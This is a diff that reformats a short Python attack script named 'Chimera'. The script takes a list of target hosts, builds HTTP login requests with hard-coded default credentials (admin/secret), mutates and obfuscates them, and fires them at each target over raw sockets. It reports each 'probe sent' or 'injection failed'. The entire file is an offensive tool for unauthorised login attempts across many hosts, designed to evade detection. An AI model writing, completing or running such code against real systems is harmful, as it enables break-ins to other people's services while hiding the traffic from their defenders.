@@ -1,7 +1,9 @@
+import socket
+
+from memory_engine import get_top_targets
 from neural_mutator import mutate
 from obfuscator_engine import obfuscate_http
-import socket
-from memory_engine import get_top_targets
+
 
 def fire():
     targets = get_top_targets()
@@ -12,7 +14,9 @@ def fire():
     for t in targets:
         ip, port = t.split(":")
         port = int(port)
-        base = f"POST /login HTTP/1.1\r\nHost: {ip}\r\n\r\nusername=admin&password=secret"
+        base = (
+            f"POST /login HTTP/1.1\r\nHost: {ip}\r\n\r\nusername=admin&password=secret"
+        )
         raw = mutate(base)
         obs = obfuscate_http(raw)
         try:
@@ -24,6 +28,7 @@ def fire():
             print(f"[+] Chimera probe sent to {ip}:{port}")
         except Exception as e:
             print(f"[!] Chimera injection failed to {ip}:{port} - {e}")
+
 
 if __name__ == "__main__":
     fire()
